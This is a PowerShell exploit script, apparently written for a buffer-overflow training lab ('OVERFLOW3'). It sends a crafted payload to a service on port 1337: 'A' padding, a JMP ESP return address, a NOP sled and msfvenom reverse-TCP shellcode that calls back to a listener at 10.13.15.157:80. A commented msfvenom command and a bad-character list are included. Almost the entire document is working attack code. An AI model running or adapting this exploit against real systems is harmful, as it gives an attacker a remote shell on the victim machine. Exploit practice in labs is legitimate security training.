# Bad chars: 
    # 0x00,0x11,0x40,0x5f,0xb8,0xee
    # \x00\x11\x40\x5f\xb8\xee
<# 
msfvenom -p windows/shell_reverse_tcp \
LHOST=10.13.15.157 LPORT=80 EXITFUNC=process \
-f powershell -a x86 -b '\x00\x11\x40\x5f\xb8\xee'
#>

$server = '10.10.186.66'
$port = 1337
[byte[]][char[]]$function = 'OVERFLOW3 '
[byte[]][char[]]$fuzz = 'A' * 1274 # + 'POOP'
#$badChars = 0x00,0x11,0x40,0x5f,0xb8,0xee
#$testChars = 0..255 | Where-Object { $_ -notin $badChars }
[byte[]]$jmpEsp = 0x03,0x12,0x50,0x62 # JMP ESP 62501203 Little endian order
[byte[]]$nopSled = @(0x90) * 32
[byte[]]$shellcode = 0xfc,0xbb,0xb2,0x2d,0xf4,0xc4,0xeb,0xc,0x5e,0x56,0x31,0x1e,0xad,0x1,0xc3,0x85,0xc0,0x75,0xf7,0xc3,0xe8,0xef,0xff,0xff,0xff,0x4e,0xc5,0x76,0xc4,0xae,0x16,0x17,0x4c,0x4b,0x27,0x17,0x2a,0x18,0x18,0xa7,0x38,0x4c,0x95,0x4c,0x6c,0x64,0x2e,0x20,0xb9,0x8b,0x87,0x8f,0x9f,0xa2,0x18,0xa3,0xdc,0xa5,0x9a,0xbe,0x30,0x5,0xa2,0x70,0x45,0x44,0xe3,0x6d,0xa4,0x14,0xbc,0xfa,0x1b,0x88,0xc9,0xb7,0xa7,0x23,0x81,0x56,0xa0,0xd0,0x52,0x58,0x81,0x47,0xe8,0x3,0x1,0x66,0x3d,0x38,0x8,0x70,0x22,0x5,0xc2,0xb,0x90,0xf1,0xd5,0xdd,0xe8,0xfa,0x7a,0x20,0xc5,0x8,0x82,0x65,0xe2,0xf2,0xf1,0x9f,0x10,0x8e,0x1,0x64,0x6a,0x54,0x87,0x7e,0xcc,0x1f,0x3f,0x5a,0xec,0xcc,0xa6,0x29,0xe2,0xb9,0xad,0x75,0xe7,0x3c,0x61,0xe,0x13,0xb4,0x84,0xc0,0x95,0x8e,0xa2,0xc4,0xfe,0x55,0xca,0x5d,0x5b,0x3b,0xf3,0xbd,0x4,0xe4,0x51,0xb6,0xa9,0xf1,0xeb,0x95,0xa5,0x36,0xc6,0x25,0x36,0x51,0x51,0x56,0x4,0xfe,0xc9,0xf0,0x24,0x77,0xd4,0x7,0x4a,0xa2,0xa0,0x97,0xb5,0x4d,0xd1,0xbe,0x71,0x19,0x81,0xa8,0x50,0x22,0x4a,0x28,0x5c,0xf7,0xdd,0x78,0xf2,0xa8,0x9d,0x28,0xb2,0x18,0x76,0x22,0x3d,0x46,0x66,0x4d,0x97,0xef,0xd,0xb4,0x70,0x1a,0xdf,0xb9,0x1d,0x72,0xdd,0xc5,0x1d,0xd3,0x68,0x23,0x77,0xc3,0x3c,0xfc,0xe0,0x7a,0x65,0x76,0x90,0x83,0xb3,0xf3,0x92,0x8,0x30,0x4,0x5c,0xf9,0x3d,0x16,0x9,0x9,0x8,0x44,0x9c,0x16,0xa6,0xe0,0x42,0x84,0x2d,0xf0,0xd,0xb5,0xf9,0xa7,0x5a,0xb,0xf0,0x2d,0x77,0x32,0xaa,0x53,0x8a,0xa2,0x95,0xd7,0x51,0x17,0x1b,0xd6,0x14,0x23,0x3f,0xc8,0xe0,0xac,0x7b,0xbc,0xbc,0xfa,0xd5,0x6a,0x7b,0x55,0x94,0xc4,0xd5,0xa,0x7e,0x80,0xa0,0x60,0x41,0xd6,0xac,0xac,0x37,0x36,0x1c,0x19,0xe,0x49,0x91,0xcd,0x86,0x32,0xcf,0x6d,0x68,0xe9,0x4b,0x9d,0x23,0xb3,0xfa,0x36,0xea,0x26,0xbf,0x5a,0xd,0x9d,0xfc,0x62,0x8e,0x17,0x7d,0x91,0x8e,0x52,0x78,0xdd,0x8,0x8f,0xf0,0x4e,0xfd,0xaf,0xa7,0x6f,0xd4,0xaf,0x47,0x90,0xd7
$pwnz = $function + $fuzz + $jmpEsp + $nopSled + $shellcode
$socket = [System.Net.Sockets.TcpClient]::new()

try {
    $socket.Client.Connect($server, $port)
}
catch {
    $socket.Close()
    $socket.Dispose()
    throw $_.Exception
}

try {
    $socket.Client.Send($pwnz)
    $socket.Close()
    $socket.Dispose()
}
catch {
    $socket.Close()
    $socket.Dispose()
    throw $_.Exception
}